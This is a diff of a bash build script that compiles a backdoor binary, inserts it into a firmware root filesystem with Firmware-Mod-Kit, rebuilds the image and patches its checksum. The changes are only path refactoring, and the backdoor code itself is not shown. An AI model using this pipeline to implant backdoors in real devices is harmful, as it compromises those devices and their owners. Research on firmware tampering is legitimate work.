@@ -1,13 +1,8 @@
 #!/bin/bash
 
-# Globals:
-REPO_CODE_PATH=`dirname "$0"`
-# Generate random version between 1 to 200.
-RANDOM_FIRMWARE_VERSION=$(( (RANDOM % 200) + 1 ))
-
 # User specific paths:
-TARGET_DIRECTORY=$HOME'/shared_projects/embedded/tmp'
-FIRMWARE_NAME="new-firmware_version.bin"
+NEW_FIRMWARE_DIRECTORY=$HOME'/shared_projects/embedded/tmp'
+FIRMWARE_NAME="new-firmware_version.bin" # Version will be replaced with the random number to mark this version.
 
 # Firmware-Mod-Kit paths:
 FMK_DIR=$HOME'/tools/firmware-mod-kit-master'
@@ -15,11 +10,18 @@ FMK_FIRMWARE_DIR='fmk'
 FMK_BUILD_FIRMWARE_SCRIPT='build-firmware.sh'
 FMK_OUTPUT_FIRMWARE='new-firmware.bin'
 
+# Globals:
+SCRIPT_PATH=$(readlink -f "$0")
+REPO_PATH=$(dirname $(dirname "$SCRIPT_PATH"))
+
+# Generate random version between 1 to 200.
+RANDOM_FIRMWARE_VERSION=$(( (RANDOM % 200) + 1 ))
+
 compile_backdoor() {
     echo "======================================="
     echo "Compling the backdoor from it's sources"
     echo "======================================="
-    pushd $REPO_CODE_PATH/backdoor > /dev/null
+    pushd $REPO_PATH/backdoor > /dev/null
     make release
     if [[ $? -ne 0 ]]; then
         echo "Failed to compile latest backdoor version, resuming with old version!"
@@ -32,7 +34,7 @@ insert_backdoor() {
     echo "Inserting backdoor to firmware"
     echo "=============================="
     echo "Putting the backdoor binary in the firmware bin directory."
-    cp $REPO_CODE_PATH/backdoor/bin/bd $FMK_DIR/$FMK_FIRMWARE_DIR/rootfs/bin/
+    cp $REPO_PATH/backdoor/bin/bd $FMK_DIR/$FMK_FIRMWARE_DIR/rootfs/bin/
     if [[ $? -ne 0 ]]; then
         echo "Failed inserting backdoor to firmware, try to run with sudo."
         echo "Stopping build process..."
@@ -62,7 +64,7 @@ fix_checksum() {
     echo "============================"
     echo "Fixing the firmware checksum"
     echo "============================"
-    python3 $REPO_CODE_PATH/scripts/update_checksum.py -u $FMK_DIR/$FMK_FIRMWARE_DIR/$FMK_OUTPUT_FIRMWARE
+    python3 $REPO_PATH/scripts/update_checksum.py -u $FMK_DIR/$FMK_FIRMWARE_DIR/$FMK_OUTPUT_FIRMWARE
 }
 
 # Note: to update firmware version, this script must be run as sudo.
@@ -91,7 +93,7 @@ save_firmware() {
     else
         new_firmware_name=${FIRMWARE_NAME//version/unkown}
     fi
-    new_firmware_filepath=$TARGET_DIRECTORY/$new_firmware_name
+    new_firmware_filepath=$NEW_FIRMWARE_DIRECTORY/$new_firmware_name
     echo "====================================================================================="
     echo "Saving new firmware in $new_firmware_filepath"
     echo "====================================================================================="
